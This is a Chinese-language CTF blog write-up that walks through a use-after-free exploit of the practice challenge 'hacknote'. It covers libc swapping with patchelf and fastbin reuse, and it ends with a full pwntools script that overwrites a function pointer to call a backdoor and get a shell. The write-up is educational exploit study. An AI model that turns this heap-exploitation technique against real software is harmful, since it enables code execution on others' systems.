---
title: 「PWN」堆的第一次尝试 - UseAfterFree
description: nova在博客中分享了他首次尝试堆漏洞利用，专注于“Use After Free”，并且提到他将来会介绍“双重释放和解除链接”的问题。他引用了CTF-WIKI上的例题`hacknote`，并解释了使用不同的`libc`版本为动态解释器的方法。
pubDate: 2022-06-30
tags:
- CTF
- Pwn
authors:
- nova
---

磨磨蹭蹭这么久也总算是入 HEAP 的坑了

感谢 Ayoung 不开之恩（bushi）

先来看一下最简单的`Use After Free`利用，对堆的知识需求很低。明天估计会写一个`Double Free + Unlink`的

用的是`CTF-WIKI`的原题[hacknote](https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote/hacknote)

<!--truncate-->

# Pwntools 使用不同的`libc`作为动态解释器的方法

这里提一下中途遇到的坑。`libc-2.31`对堆的回收机制有了不少改变，因此在一开始根据`CTF-WIKI`的方法调试的时候行不通。因此写一下更换动态解释器的方法。

首先需要两个工具，[glibc-all-in-all](https://github.com/matrix1001/glibc-all-in-one)和[patchelf](https://github.com/NixOS/patchelf)

安装方法自行查看`README.md`不多赘述

下载对应的`libc`后，使用`patchelf`对`ELF`文件进行解释

```sh
patchelf --set-interpreter /path/to/libc/libc-2.23.so --set-rpath /path/to/libc/ ./binary_file_name

# For Example: patchelf --set-rpath /home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ --set-interpreter /home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./use_after_free
```

##

# Use After Free

引起这个漏洞的原因主要是`dangling pointer` —— 在`free()`后内存指针没有被设置为 NULL。

如果此时其他代码修改了这段内存的内容的话，再次使用这段内存就会出现问题。

## Source

```sh
gcc -m64 -fno-stack-protector -no-pie -z execstack -g use_after_free.c -o use_after_free
# Make
```

保护全关、64 位

![struct_note](https://cdn.nova.gal/img/image-20220314214330300.png)

程序定义了一个结构体，定义了一个`printnote`的指针指向`print_note_content`方法以及一个`content`的指针。

![add_note()](https://cdn.nova.gal/img/image-20220314214555940.png)

看一下`add_note()`的实现：首先`malloc`了一个`struct note`，也就是 16 字节的堆。在这之后，为`content`申请了`size`字节的堆。

![del_note()](https://cdn.nova.gal/img/image-20220314214818884.png)

注意看`del_note()`。在删除节点后，`count`没有变化——这一方面限制了我们`add_note()`的次数，另一方面也给我们的漏洞利用提供了便利。同时，我们可以发现`free`之后`notelist[idx]`并没有置为`NULL`，这便给我们的`Use After Free`带来了可能。

![print_note()](https://cdn.nova.gal/img/image-20220314215110776.png)

可以看出，`print_note()`调用了`notelist[idx]->printnote(notelist[idx])`方法，假如我们能把`notelist[idx]->printnote`的内存修改了的话，也就能做到执行后门函数的效果了。

## Exploit

因为`struct note`是固定`0x20`大小的`chunk`，所以我们主要思考`fastbins`相关的利用

因为`fastbins`维护了`0x20~0x80`的数个链表，且有后进先出的机制。我们不妨这样思考：

倘若我们申请两个`0x20`的 note 记为`note1`、`note2`，此时我们的程序应该有 4 个堆——两个大小为`0x20`的`note1_struct_note`和`note2_struct_note`以及两个大小为`0x30`的`note1`和`note2`（不计算`PREV_IN_USE`的一字节）

这时我们将两个 note 全部释放，则`fastbisn`中此时应该是这样的

```sh
fastbins:
	0x20: note2_struct_note_addr -> note1_struct_note_addr
	0x30: note2 -> note1
```

如果我们此时再申请一个`0x10`的 note`note3`呢？由`fastbins`的回收利用机制我们可以想到

第一个`note2_struct_note_addr`被分配给了`note3_struct_note_addr`，而第二个`note1_struct_note_addr`则被分配给了我们可控的`note3`

这时，如果我们将`note3`的`content`改为后门函数，并执行`print_note(0)`

——如你所料的，后门函数被执行了。

```python
from pwn import *

sh = process(["./use_after_free"])


def add_note(size, content):
    sh.recvuntil(b"Your choice :")
    sh.sendline(b"1")
    sh.recvuntil(b"Note size :")
    sh.sendline(str(size).encode())
    sh.recvuntil(b"Content :")
    sh.sendline(content)


def delete_note(index):
    sh.recvuntil(b"Your choice :")
    sh.sendline(b"2")
    sh.recvuntil(b"Index :")
    sh.sendline(f"{index}".encode())


def print_note(index):
    sh.recvuntil(b"Your choice :")
    sh.sendline(b"3")
    sh.recvuntil(b"Index :")
    sh.sendline(f"{index}".encode())


# gdb.attach(sh)
add_note(32, b"aaaa")
add_note(32, b"bbbb")
delete_note(0)
delete_note(1)
add_note(16, p64(0x4015f9)) # addr of magic()
print_note(0)
sh.interactive()
```

## GDB

以上只是理论知识，没有`GDB`实际调过确实是一知半解。

根据上面的 exp，我们分别在第二个`add_note()`和第二个`delete_note()`以及最后一个`add_note()`下调试看看

![heap after adding](https://cdn.nova.gal/img/image-20220314221552787.png)

![heap after adding](https://cdn.nova.gal/img/image-20220314221633396.png)

`0x401256`是`print_note_content()`的地址，`0xd04030`和`0xd04080`是`content`的地址

![heap after deleting](https://cdn.nova.gal/img/image-20220314221804318.png)

![heap after deleting](https://cdn.nova.gal/img/image-20220314221824810.png)

![heap after deleting](https://cdn.nova.gal/img/image-20220314221944311.png)

可以看出，不同大小的链表进入了不同的`fastbins`中。

![heap final](https://cdn.nova.gal/img/image-20220314222135890.png)

![heap final](https://cdn.nova.gal/img/image-20220314222201810.png)

![heap final](https://cdn.nova.gal/img/image-20220314222221269.png)

最后一次添加之后，我们发现：`fastbins`中的两个`0x20`大小的堆被回收利用了！且作为`content`的`0x4015f9`的后门函数地址已经写到了一开始`print_note_content()`的地方

此时运行`print_note()`，后门函数便执行了

![Shell!](https://cdn.nova.gal/img/image-20220314222613059.png)
